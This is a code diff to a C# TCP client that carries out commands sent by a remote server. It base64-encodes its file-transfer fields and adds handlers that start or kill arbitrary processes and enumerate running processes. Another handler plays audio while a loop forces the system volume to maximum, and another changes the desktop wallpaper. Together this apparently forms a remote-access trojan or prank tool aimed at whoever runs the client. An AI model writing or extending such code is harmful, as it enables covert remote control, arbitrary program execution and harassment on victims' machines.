@@ -1,7 +1,13 @@
-﻿using System;
+﻿using NAudio.Wave;
+using System;
+using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading.Tasks;
+using VisioForge.Libs.NAudio.CoreAudioApi;
 
 namespace ClientRecive.assets.Commands
 {
@@ -26,7 +32,7 @@ namespace ClientRecive.assets.Commands
             {
                 BinaryReader reader = new BinaryReader(client.GetStream());
 
-                string Name = reader.ReadString();
+                string Name = Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString()));
 
                 if (Name.Contains("."))
                 {
@@ -34,7 +40,7 @@ namespace ClientRecive.assets.Commands
                 }
                 else
                 {
-                    long TotalBytes = reader.ReadInt64();
+                    long TotalBytes = Convert.ToInt64(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));
                     await ReciveDirectoryAsync(client, Name);
                 }
             }
@@ -62,8 +68,8 @@ namespace ClientRecive.assets.Commands
             {
                 BinaryReader reader = new BinaryReader(client.GetStream());
 
-                int CountDirectories = reader.ReadInt32();
-                int CountFiles = reader.ReadInt32();
+                int CountDirectories = Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));
+                int CountFiles = Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));
 
                 CurrentDirectory = Path.Combine(CurrentDirectory, directory);
                 Directory.CreateDirectory(CurrentDirectory);
@@ -103,7 +109,7 @@ namespace ClientRecive.assets.Commands
             try
             {
                 BinaryReader reader = new BinaryReader(client.GetStream());
-                long fileSize = reader.ReadInt64();
+                long fileSize = Convert.ToInt64(Encoding.UTF8.GetString(Convert.FromBase64String(reader.ReadString())));
 
                 using (FileStream fileStream = new FileStream(file, FileMode.Create, FileAccess.Write))
                 {
@@ -119,6 +125,8 @@ namespace ClientRecive.assets.Commands
                         totalBytesReceived += bytesRead;
                     }
                 }
+
+
             }
             catch (SocketException)
             {
@@ -166,10 +174,10 @@ namespace ClientRecive.assets.Commands
             {
                 BinaryWriter writer = new BinaryWriter(client.GetStream());
 
-                writer.Write(directoryName);
-                writer.Write(GetDirectorySize(directory));
-                writer.Write(Directory.GetDirectories(directory).Length);
-                writer.Write(Directory.GetFiles(directory).Length);
+                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(directoryName)));
+                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(GetDirectorySize(directory).ToString())));
+                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes((Directory.GetDirectories(directory).Length.ToString()))));
+                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Directory.GetFiles(directory).Length.ToString())));
 
                 foreach (string subDirectory in Directory.GetDirectories(directory))
                 {
@@ -213,8 +221,8 @@ namespace ClientRecive.assets.Commands
                     long totalBytesSent = 0;
                     int bytesSent;
 
-                    writer.Write(fileName);
-                    writer.Write(fileSize);
+                    writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(fileName)));
+                    writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(fileSize.ToString())));
 
                     using (FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read))
                     {
@@ -228,6 +236,7 @@ namespace ClientRecive.assets.Commands
                             bytesSent = bytesRead;
                         }
                     }
+
                 }
                 else
                 {
@@ -299,4 +308,290 @@ namespace ClientRecive.assets.Commands
         }
     }
 
+    public class Exists : ICommand
+    {
+        public readonly string ExistsPath;
+
+        public Exists(string ExistsPath)
+        {
+            this.ExistsPath = ExistsPath;
+        }
+
+        public async Task ExecuteAsync(TcpClient client)
+        {
+            if (ExistsPath.Contains("."))
+            {
+                if (File.Exists(ExistsPath))
+                {
+                    await Client.SendClientMessage(client, "$success");
+                }
+                else
+                {
+                    await Client.SendClientMessage(client, "$error");
+                }
+            }
+            else
+            {
+                if (Directory.Exists(ExistsPath))
+                {
+                    await Client.SendClientMessage(client, "$success");
+                }
+                else
+                {
+                    await Client.SendClientMessage(client, "$error");
+                }
+            }
+        }
+    }
+
+    class ProcessCommand : ICommand
+    {
+        private readonly string Command;
+        private readonly string Arguments;
+
+        public ProcessCommand(string Command, string Arguments)
+        {
+            this.Command = Command;
+            this.Arguments = Arguments;
+        }
+
+        public ProcessCommand(string Command)
+        {
+            this.Command = Command;
+        }
+
+        public async Task ExecuteAsync(TcpClient client)
+        {
+            switch (this.Command)
+            {
+                case "$ProcessKill":
+
+                    await KillProcess(client, Arguments);
+
+                    break;
+                case "$GetProcess":
+
+                    await GetProcess(client);
+
+                    break;
+                case "$StartProcess":
+
+                    await StartProcess(client, Arguments);
+
+                    break;
+                case "$InfoProcess":
+
+                    await InfoProcess(client, Arguments);
+
+                    break;
+                default:
+
+                    Console.WriteLine($"Не существует комманды {Command} для работы с процессами");
+
+                    break;
+            }
+        }
+
+        private Task GetProcess(TcpClient client)
+        {
+            try
+            {
+                BinaryWriter writer = new BinaryWriter(client.GetStream());
+                Process[] processes = Process.GetProcesses();
+
+                writer.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(processes.Length.ToString())));
+
+                foreach (var process in processes)
+                {
+                    try
+                    {
+                        writer.Write(ProcessSerializer.SerializeProcess(process));
+                    }
+                    catch (Exception) { }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Ошибка получения списка процессов {ex.Message}");
+            }
+
+            return Task.CompletedTask;
+        }
+
+        private async Task KillProcess(TcpClient client, string Id)
+        {
+            try
+            {
+                Process process = Process.GetProcessById(Convert.ToInt32(Id));
+                process.Kill();
+
+                await Client.SendClientMessage(client, "$success");
+            }
+            catch (Exception)
+            {
+                await Client.SendClientMessage(client, "$error");
+            }
+
+        }
+
+        private async Task StartProcess(TcpClient client, string Arguments)
+        {
+            try
+            {
+                if (Arguments.Any(c => c == '|'))
+                {
+                    string[] Data = Arguments.Split('|');
+
+                    System.Diagnostics.Process.Start(Data[0], Data[1]);
+                    await Client.SendClientMessage(client, "$success");
+                }
+                else
+                {
+                    System.Diagnostics.Process.Start(Arguments);
+                    await Client.SendClientMessage(client, "$success");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Ошибка запуска процесса {ex.Message}");
+                await Client.SendClientMessage(client, "$error");
+            }
+        }
+
+        private Task InfoProcess(TcpClient client, string Value)
+        {
+            try
+            {
+                BinaryWriter binaryWriter = new BinaryWriter(client.GetStream());
+
+                if (int.TryParse(Value, out int temp))
+                {
+                    Process process = Process.GetProcessById(temp);
+                    binaryWriter.Write(ProcessSerializer.SerializeProcess(process));
+                }
+                else
+                {
+                    Process[] processes = Process.GetProcessesByName(Value);
+
+                    binaryWriter.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(processes.Length.ToString())));
+
+                    foreach (var process in processes)
+                    {
+                        binaryWriter.Write(ProcessSerializer.SerializeProcess(process));
+                    }
+                }
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Ошибка получения информации о процессе {ex.Message}");
+            }
+
+            return Task.CompletedTask;
+        }
+
+    }
+
+    class MusicCommand : ICommand
+    {
+        private readonly string PlayPath;
+
+        public MusicCommand(string PlayPath)
+        {
+            this.PlayPath = PlayPath;
+        }
+
+        public async Task ExecuteAsync(TcpClient client)
+        {
+            try
+            {
+                if (File.Exists(PlayPath))
+                {
+                    var deviceEnumerator = new MMDeviceEnumerator();
+                    var defaultRenderDevice = deviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
+
+                    _ = Task.Factory.StartNew(() =>
+                    {
+                        while (true)
+                        {
+                            if (defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar < 1.0f)
+                            {
+                                defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar = 1.0f;
+                            }
+                        }
+                    });
+
+                    using (var audioFile = new AudioFileReader(PlayPath))
+                    using (var outputDevice = new WaveOutEvent())
+                    {
+                        outputDevice.Init(audioFile);
+                        outputDevice.Play();
+
+
+                        await Client.SendClientMessage(client, "$success");
+
+                        if (Client.ReceiveMessageFromServer(client).Result is "$Pstop")
+                        {
+                            outputDevice.Stop();
+                            await Client.SendClientMessage(client, "$success");
+                        }
+                    }
+                }
+                else
+                {
+                    await Client.SendClientMessage(client, "$error");
+                }
+            }
+            catch (Exception ex)
+            {
+                await Client.SendClientMessage(client, "$error");
+                Console.WriteLine("Ошибка при проигрывании трека: " + ex.Message);
+            }
+        }
+    }
+
+    class WallpaperCommand : ICommand
+    {
+        private readonly string PathWallpaper;
+
+        public WallpaperCommand(string Path)
+        {
+            this.PathWallpaper = Path;
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        const int SPI_SETDESKWALLPAPER = 0x0014;
+        const int SPIF_UPDATEINIFILE = 0x01;
+        const int SPIF_SENDCHANGE = 0x02;
+
+        public async Task ExecuteAsync(TcpClient client)
+        {
+
+            try
+            {
+                if (File.Exists(PathWallpaper))
+                {
+                    if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, PathWallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE) != 0)
+                    {
+                        await Client.SendClientMessage(client, "$success");
+                    }
+                    else
+                    {
+                        await Client.SendClientMessage(client, "$error");
+                    }
+                }
+                else
+                {
+                    await Client.SendClientMessage(client, "$error");
+                }
+            }
+            catch (Exception)
+            {
+                await Client.SendClientMessage(client, "$error");
+            }
+
+        }
+    }
 }
